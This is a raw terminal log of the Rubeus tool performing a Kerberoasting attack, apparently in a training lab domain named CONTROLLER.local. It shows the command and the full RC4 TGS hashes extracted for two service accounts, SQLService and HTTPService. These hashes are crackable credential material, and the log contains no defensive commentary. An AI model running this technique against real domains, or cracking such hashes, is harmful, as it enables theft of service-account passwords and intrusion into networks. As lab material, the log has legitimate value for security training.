controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca
                             l:30111*$99A4892AC23255EFB00D8D3AFD60C6D9$3F380E68A6F30F628D510BF26F22CC01AEE3D3
                             88D8B96B797189BD4AA12FADDD98D158AE5D15D6E04A36E0BCF2B9B9939B206134B2EBE3F8479253
                             FFC337B563ECB8147808BEB9329540CC62AFCDE234FBB1F4136C1F9E2B71FE768068871CE0D51130
                             7DD6666AAFC36E91B21201DC1A057CB019E66227CAD51CC4208F1CAF42BC4D322347D6BC92995D20
                             869044D896DBAAF3C274D0EA61B8BBC4D744F411C251A215FFBA1BA059C531F17652E1114980D26A
                             6FF218DB6AE969CC72BD70C2D093A742C5705B76CEEB70A7AD31D61424696E3AEE153AA49914480A
                             3F0F53B578383BDD4F2FBF07D3F8B6011848235AC7449E59A4993E0770BD3F015BC3E49B3EBB7F10
                             139700033938497BFE6C0DA4DCE38C96A9B65A2C2B9537ADC3D1FA38D1BF978BF3E960275FE09D05
                             091F1731404B2216A0E3272A88E3281AF465CE60A853BD9B3706A8F40E16A23D38D943D0E69BBFB2
                             6A5EEE875D1D5CB75ABDA23C0A78FB03DA9D9482F282246F431891DDC2BB431E63D54F476677EEEB
                             9FB82D6F204E4C16AD37EE60AA8975513CD939EA4E2A6B693484A699239678E375C8B0AEB56A2553
                             9492581951ED3288A46AE974DDDE49F8955A125F82472507B4863F905BEE4F63F5B4E05829251F62
                             DE051E646F88E0984B375124D29F926B1EC71BFAF978B21E3554398EA6E7E1D6DAE97D94874E79B9
                             5D74866E88A6C696529A5345B7C460E8D88FBCC44CB2C5FBB4057E0E8E3A4C3E18E9009486B3F071
                             3556A83770C9C34EAB52A7D70BA5BB57709D8509DCCFC07DC11222A826598615181B4F9FD265F525
                             54E5C6C4EFA2EDFD3849DA26D0F22FE654BB11C0F19A7C1A7C0AAF1B77A20D81932A2CD06B745534
                             56899D8F68B78D45F33C65AD1B7B73C8E3DEBB4C23D339D6A22D2D14AB925B946BAE10B276BD5685
                             6AFDAF804ADB1D5C2791BEF16B133BB5A69E88192B35B25B05C4AEDF40FD874089B77CD55A4A616A
                             91CF2813C917F3C513DB8CF8907FFE8AD19C7DC0F170FBE280CC5FBAC7FD66D35ECF61C34C270782
                             D0FD3322B46D518298C16737C7E245627ADC4B61FA8E37D077C39A237F349AEF0F24FCA3C2EACF36
                             BEE9856B754C0F696F79C7B3C177A9790434399B152106866CD238C36CA335F28736488649CFED38
                             C994673EC9B4BF80E5C29D14D0EE5C3282D695CE4550DCC742764D9D997649D24275013014B8675D
                             6FAA8655471F615CE2D2178E6E2135401911FA01B6DB03007E09ED58B11E58D9A74582383C24B3AB
                             01DAC96BF8A9F7F8E73C002AD0E3680CD3876BE897364F3E5E4B0752DE5AA64C386D55BA8ED5249F
                             F09FF4DE50CF8F3C84FCA6C9A58325476987FD04E886D70ADDC7CABC223D862572D6298C1B4611F4
                             A15F099471E662621BF099BBC0F5DE5088A1ADA6793EE4122FAF0BEB8BF82CBD1CD24B7172FC3910
                             9BCC28F28FD24CC2D9CEFB27FE8B5D749C4F606ADE2FD2348EC4BE290832CCB49004F224F87554BF
                             F18E3F713F1864F615723D504C2AA7FDE3E3F8F6A8D447C3120CA347B959121A4F67599057703DAA
                             9F1BF144009E196CC1FC5B56304DF6A679EDB1236C5A45FF821EB5C575A02D4B4A34662928FE536F
                             97FCF5C4EEFD94A86158902A9F200FF02757DB23DFF61CF07A1491E2A7


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$5DFB241F1E17D6D3A1C5AB389249EE4B$9BC72A6604F2FB2FF58C7138A47EF9B0FA9C
                             3C2C6F3AFE089391E452D966FE45D4A17389F884D68CAB83FE07A936DBF6E8C1F55621FFB255B129
                             AE05A880DB778C9C9EA7ECA9172EF21A4949334F076E8BE0BE546F5EC3F33233B9A2AC4D79C085B7
                             C46841F58C816E7E32BDE75D2BCBE017AC3E53670766E7AD8DDE350FABB983D515FABC31E903CD53
                             16362119ADB5276831F1426FF3DF9C573E2DAE3222107A15D1C8256E42C3D1F058194DC616FE3D8D
                             F108CC4457B2CAEC0B0EC0836279885AF4D82F1BD50362C8F8F7FD4B2591C9C393DC7F1BCB7EDC21
                             75F2793865FD647085C837DE2494B4155656C91D20ED420157CA35D97F78C6BCE039B7897FA1F58D
                             8032E4690BB3D820F214BC7F5A4C88E78648C40DCA5801B5101C4BABCAFCCF011273995730E33682
                             2A4F4C83D54AA13727E129DBEE27238158BC4200848C7D68FE566971A47D5D89685B2150AC7CA978
                             BF564E3EB1718B795033B364F356F11E6EEA3E4C02FCE41CF9D44AB3BEB5DF1322DBFDE67588176A
                             A709DE7DFA8460CE7AF6E3D82E785B67B1EE5813D7AB7A8671C328DCED61AFCC3351BE7D2F7BBB88
                             7BF558915A0E01DC37E0E4582DB305B74CE0527CF11C08624E2F0EA639AF4E08516BD4F9416DD9E5
                             08807029CAE77DBD588196C4DB07B592C6AD3E930B275622E9001EF13DFD013933EA3699C9B176B3
                             1926E7B9CD7FBCEA139163DD0A106BBAD7434B5C6A5785C013369C30BF7CBFA68CE61127E4D222E3
                             8D13BE3A0ABA0357481C36AF71F0A416CAF66B1C87B7D7027B358678D2ADE587938D7ABAED703901
                             62F3292DF79A53DC815F1869F60AA70250F63E76AFAEDE87779450EE2502CE7544A10870DB0E1825
                             732E7F9B4730A1B62E10214A3249B1D6C0BE71EE94FF1B5AFFABB18C9A4AD2DDE1904493BF274182
                             AB50A5D92A43BEB46BF6AD6AA1404312D1957110C45AEC065F7CDE9C160ACDE60ADE727721AE084F
                             A79287D14D099005FB40B2897EFF2B578506094EE0BC8C824277F89E8BABAB80324F993160C08B00
                             7AE8AD5F49CB8F7077A14BD57350D87B1047AE6815C662AE25BD94F389EC9B66EDEFC42ACC47F2E3
                             02FAB5510392863026C09A790BF4E63004F30A1C7DD08AF2D2F544519AD07E0D30082F5C4390F4B7
                             953568E90490FAFEAF7C2201F5F4462B414E602EA411FE7325A519D3BD8CCE2CCE643B4F7D502D89
                             D9AB1CBAB1D9B23182883A659ACC8F65DEAC3A3FCF949F92F08909BE8A579B190D5D04EA25A71873
                             885EB5F86FDE83E528BF520C8859193B1BA26ADCDD60C3ED866A8915D57620B0BF92454BD9E3BABB
                             FE5F4D4FC1F3C31C52322FC5306CB542FACB81284E4AC56E9F8EB4D4BEA2CCD16390A9AADBC712E7
                             4514F8572D51158355906564A3EE036237BF3E8AB227223CA3399F24794056D7AC5CDD43E13680A5
                             84FD3D08FFE537D40C3AF4A67FCC0E81CC96DAC5F6938D23D04CD7E93CDDF3F4F6842F1967F89EEE
                             3F2772466C119E7EF7466531B8CD1661F309D4EE8F19BBA24BC831638493A0E8EA3B3802F77475B1
                             0C7B87094D22125A8263744F0C97140352AE826AC64110845A0557F2FC55A3CB2C0EEA6377844FD3
                             C4F4A5DEE69A6061D38A1B91271F7D1088A44CAA6AAC02AC3D6F1262342E
